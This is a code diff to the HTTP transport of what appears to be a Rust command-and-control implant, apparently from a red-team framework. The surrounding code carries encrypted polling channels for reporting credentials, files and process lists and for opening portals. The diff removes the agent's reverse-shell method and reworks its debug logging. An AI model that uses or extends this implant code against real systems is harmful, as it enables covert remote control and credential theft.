@@ -89,7 +89,6 @@ static REPORT_CREDENTIAL_PATH: &str = "/c2.C2/ReportCredential";
 static REPORT_FILE_PATH: &str = "/c2.C2/ReportFile";
 static REPORT_PROCESS_LIST_PATH: &str = "/c2.C2/ReportProcessList";
 static REPORT_OUTPUT_PATH: &str = "/c2.C2/ReportOutput";
-static REVERSE_SHELL_PATH: &str = "/c2.C2/ReverseShell";
 static CREATE_PORTAL_PATH: &str = "/c2.C2/CreatePortal";
 
 // Marshal: Encode and encrypt a message using the ChachaCodec
@@ -212,7 +211,7 @@ impl HTTP {
                 let request_bytes = match marshal_with_codec::<Req, Resp>(msg) {
                     Ok(bytes) => bytes,
                     Err(err) => {
-                        #[cfg(debug_assertions)]
+                        #[cfg(feature = "print_debug")]
                         log::error!("Failed to marshal streaming message: {}", err);
                         continue;
                     }
@@ -238,13 +237,13 @@ impl HTTP {
             {
                 Ok(Ok(resp)) => resp,
                 Ok(Err(err)) => {
-                    #[cfg(debug_assertions)]
+                    #[cfg(feature = "print_debug")]
                     log::error!("Failed to send short poll HTTP request: {}", err);
                     tokio::time::sleep(std::time::Duration::from_secs(1)).await;
                     continue;
                 }
                 Err(_) => {
-                    #[cfg(debug_assertions)]
+                    #[cfg(feature = "print_debug")]
                     log::error!("Short poll HTTP request timed out after 30s");
                     tokio::time::sleep(std::time::Duration::from_secs(1)).await;
                     continue;
@@ -258,7 +257,7 @@ impl HTTP {
             let mut data_received = false;
             let result: Result<()> = match body_bytes {
                 Ok(bytes) => {
-                    #[cfg(debug_assertions)]
+                    #[cfg(feature = "print_debug")]
                     if !bytes.is_empty() {
                         log::debug!("Received short poll response body: {} bytes", bytes.len());
                     }
@@ -270,7 +269,7 @@ impl HTTP {
                     {
                         frame_count += 1;
                         data_received = true;
-                        #[cfg(debug_assertions)]
+                        #[cfg(feature = "print_debug")]
                         log::debug!(
                             "Extracted frame {} from short poll response ({} bytes)",
                             frame_count,
@@ -279,7 +278,7 @@ impl HTTP {
 
                         match unmarshal_with_codec::<Req, Resp>(&encrypted_message) {
                             Ok(response_msg) => {
-                                #[cfg(debug_assertions)]
+                                #[cfg(feature = "print_debug")]
                                 log::debug!("Unmarshaled message {} from short poll response, sending to channel", frame_count);
 
                                 if let Err(err) = tx.send(response_msg).await {
@@ -305,7 +304,7 @@ impl HTTP {
             };
 
             if let Err(err) = result {
-                #[cfg(debug_assertions)]
+                #[cfg(feature = "print_debug")]
                 log::error!("Failed to process response frames: {}", err);
                 break;
             }
@@ -408,7 +407,7 @@ impl HTTP {
             while let Some((_header, encrypted_message)) =
                 grpc_frame::FrameHeader::extract_frame(&mut buffer)
             {
-                #[cfg(debug_assertions)]
+                #[cfg(feature = "print_debug")]
                 log::debug!(
                     "Received complete encrypted message: compression={}, {} bytes",
                     _header.compression_flag,
@@ -425,7 +424,7 @@ impl HTTP {
             // Read more data from HTTP body
             match body.data().await {
                 Some(Ok(chunk)) => {
-                    #[cfg(debug_assertions)]
+                    #[cfg(feature = "print_debug")]
                     log::debug!("Received HTTP chunk: {} bytes", chunk.len());
 
                     buffer.extend_from_slice(&chunk);
@@ -445,14 +444,14 @@ impl HTTP {
 
         // Check if there's leftover data in the buffer
         if !buffer.is_empty() {
-            #[cfg(debug_assertions)]
+            #[cfg(feature = "print_debug")]
             log::warn!(
                 "Incomplete data remaining in buffer: {} bytes",
                 buffer.len()
             );
         }
 
-        #[cfg(debug_assertions)]
+        #[cfg(feature = "print_debug")]
         log::debug!("Completed streaming messages");
 
         Ok(())
@@ -472,7 +471,7 @@ impl HTTP {
                 let request_bytes = match marshal_with_codec::<Req, Resp>(req_chunk) {
                     Ok(bytes) => bytes,
                     Err(_err) => {
-                        #[cfg(debug_assertions)]
+                        #[cfg(feature = "print_debug")]
                         log::error!("Failed to marshal chunk: {}", _err);
                         return;
                     }
@@ -489,7 +488,7 @@ impl HTTP {
                     .await
                     .is_err()
                 {
-                    #[cfg(debug_assertions)]
+                    #[cfg(feature = "print_debug")]
                     log::error!("Failed to send frame header for chunk");
                     return;
                 }
@@ -500,13 +499,13 @@ impl HTTP {
                     .await
                     .is_err()
                 {
-                    #[cfg(debug_assertions)]
+                    #[cfg(feature = "print_debug")]
                     log::error!("Failed to send chunk");
                     return;
                 }
             }
 
-            #[cfg(debug_assertions)]
+            #[cfg(feature = "print_debug")]
             log::debug!("Completed sending chunks");
         });
 
@@ -612,7 +611,7 @@ impl Transport for HTTP {
         request: FetchAssetRequest,
         tx: Sender<FetchAssetResponse>,
     ) -> Result<()> {
-        #[cfg(debug_assertions)]
+        #[cfg(feature = "print_debug")]
         let filename = request.name.clone();
 
         // Marshal and encrypt the request
@@ -632,7 +631,7 @@ impl Transport for HTTP {
             response,
             |response_msg| {
                 tx.send(response_msg).map_err(|_err| {
-                    #[cfg(debug_assertions)]
+                    #[cfg(feature = "print_debug")]
                     log::error!(
                         "Failed to send downloaded file chunk: {}: {}",
                         filename,
@@ -691,27 +690,6 @@ impl Transport for HTTP {
         self.unary_rpc(request, REPORT_OUTPUT_PATH).await
     }
 
-    async fn reverse_shell(
-        &mut self,
-        rx: tokio::sync::mpsc::Receiver<ReverseShellRequest>,
-        tx: tokio::sync::mpsc::Sender<ReverseShellResponse>,
-    ) -> Result<()> {
-        // Spawn polling loop in background and return immediately.
-        // The caller (pty.rs) expects reverse_shell() to return so the input
-        // handling loop can run concurrently, matching the gRPC transport behavior.
-        let transport = self.clone();
-        tokio::spawn(async move {
-            if let Err(_err) = transport
-                .handle_short_poll_streaming(rx, tx, REVERSE_SHELL_PATH)
-                .await
-            {
-                #[cfg(debug_assertions)]
-                log::error!("reverse_shell short poll streaming ended: {}", _err);
-            }
-        });
-        Ok(())
-    }
-
     async fn create_portal(
         &mut self,
         rx: tokio::sync::mpsc::Receiver<CreatePortalRequest>,
@@ -725,7 +703,7 @@ impl Transport for HTTP {
                 .handle_short_poll_streaming(rx, tx, CREATE_PORTAL_PATH)
                 .await
             {
-                #[cfg(debug_assertions)]
+                #[cfg(feature = "print_debug")]
                 log::error!("create_portal short poll streaming ended: {}", _err);
             }
         });
@@ -733,7 +711,7 @@ impl Transport for HTTP {
     }
 
     fn get_type(&mut self) -> pb::c2::transport::Type {
-        return pb::c2::transport::Type::TransportHttp1;
+        pb::c2::transport::Type::TransportHttp1
     }
 
     fn is_active(&self) -> bool {
@@ -842,7 +820,7 @@ impl Transport for HTTP {
                     .await
                     .map_err(|e| anyhow::anyhow!("Send failed: {}", e))?;
             }
-            "ReverseShell" | "CreatePortal" => {
+            "CreatePortal" => {
                 let (mut req_tx, body) = hyper_legacy::Body::channel();
 
                 tokio::spawn(async move {
